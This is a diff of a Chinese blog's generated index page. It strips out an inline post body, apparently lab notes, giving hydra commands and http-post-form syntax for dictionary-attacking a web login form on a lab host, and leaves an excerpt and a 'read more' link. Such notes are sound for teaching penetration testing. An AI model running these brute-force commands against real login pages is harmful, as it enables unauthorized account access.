@@ -417,37 +417,14 @@
 
       
         
-          
-            <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P password.txt \</span><br><span class="line">-s <span class="number">80</span> -t <span class="number">30</span> dc<span class="number">-4</span> --http-post-form \</span><br><span class="line"><span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=Command"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:S</span><span class="xml">=Command"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:Login</span><span class="xml"> Failed"</span></span><br><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:F</span><span class="xml">=Login Failed"</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">"/login.php:username=</span><span class="keyword">^USER</span><span class="xml">^&amp;password=</span><span class="keyword">^PASS</span><span class="keyword">^:S</span><span class="xml">=Command:H=Cookie=xxxx"</span></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<ul>
-<li><code>&lt;Error Message&gt;</code>不止搜索 html 信息，还包括 http 头（<code>S=302</code>）</li>
-<li><code>form</code> 不是 <code>from</code></li>
-<li><code>S</code>：登陆成功后 rsp 返回内容的关键词</li>
-<li><code>F</code> 或无标志，登陆失败信息</li>
-<li><code>H</code>：请求头信息</li>
-</ul>
-<br>
-
-<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html" target="_blank" rel="noopener">Using Hydra to dictionary-attack web-based login forms</a></li>
-</ul>
-<br>
-
-<hr>
-<p><img src="https://gitee.com/t_mouse/BlogPics/raw/master/uPic/Images/2020-04-19-20-%E6%88%AA%E5%B1%8F2020-04-19%2020.37.06-GX4PF5.png" alt></p>
-
-          
+          在 Burp 的 Intruder 功能受限(Pro)的环境下爆破 Web后台时，可以使用 hydra
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/20/hydra-attack-web-form/">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
